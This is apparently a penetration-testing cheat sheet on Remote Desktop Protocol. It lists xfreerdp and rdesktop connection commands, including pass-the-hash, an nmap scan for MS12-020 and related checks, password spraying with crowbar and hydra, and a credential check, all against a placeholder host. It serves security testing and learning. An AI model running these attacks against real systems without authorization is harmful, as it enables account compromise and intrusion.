# Remote Desktop Protocol (RDP)

## Summary
- [Theory](#theory)
- [Basic usage](#basic-usage)
  - [Connecting to the server](#connecting-to-the-server)
- [Methodologies](#methodologies)
  - [Enumerate for vulns](#enumerate-for-vulns)
  - [Password spraying](#password-spraying)
  - [Check for known credentials](#check-for-known-credentials)

## Theory
Remote Desktop Protocol is a proprietary protocol developed by Microsoft Corporation which provides a user with a graphical interface to connect to another computer over a network connection.

## Basic usage
### Connecting to the server
Connect with known credentials or hash using XFreeRDP.
```
xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.0.0.1 /u:'username' /p:'password'
xfreerdp /d:example.com /u:'username' /p:'password' /v:10.0.0.1
xfreerdp /d:example.com /u:'username /pth:'a1f2h48hd3810dj3313f3f3f5h432d54h' /v:10.0.0.1
```

Connect with RDesktop.
```
rdesktop -u username 10.0.0.1
rdesktop -d example.com -u username -p password 10.0.0.1
```

## Methodologies
### Enumerate for vulns
`nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 10.0.0.1`

### Password spraying
Brute force attack where an attacker sprays an authentication server with combinations of usernames and common passwords.
```
crowbar -b rdp -s 10.0.0.1/32 -U usernames.txt -c 'password'
hydra -L usernames.txt -p 'password' rdp://10.0.0.1
```

### Check for known credentials
`rdp_check example.com/username:password@10.0.0.1`
